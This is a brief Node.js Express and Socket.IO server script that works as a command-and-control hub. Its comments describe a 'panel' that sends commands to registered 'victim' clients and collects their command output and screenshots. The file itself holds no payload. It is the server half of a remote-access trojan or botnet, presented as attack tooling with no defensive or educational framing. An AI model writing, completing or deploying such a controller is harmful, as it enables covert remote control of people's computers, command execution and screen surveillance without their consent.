const express = require("express");
const http = require("http");
const { Server } = require("socket.io");

const app = express();
const server = http.createServer(app);
const io = new Server(server);

app.use(express.static("public"));

let clients = {};

io.on("connection", (socket) => {
  console.log("New connection:", socket.id);

  // Register (panel or victim)
  socket.on("register", (data) => {
    clients[socket.id] = data;
    io.emit("clients", clients);
  });

  // Receive commands from panel
  socket.on("command", ({ target, cmd }) => {
    io.to(target).emit("command", { cmd });
  });

  // Output from victim
  socket.on("output", (data) => {
    io.emit("output", data);
  });

  // Screenshot from victim
  socket.on("screenshot", (data) => {
    io.emit("screenshot", data);
  });

  // On disconnect
  socket.on("disconnect", () => {
    delete clients[socket.id];
    io.emit("clients", clients);
  });
});

server.listen(3000, () => {
  console.log("Server running at http://localhost:3000");
});
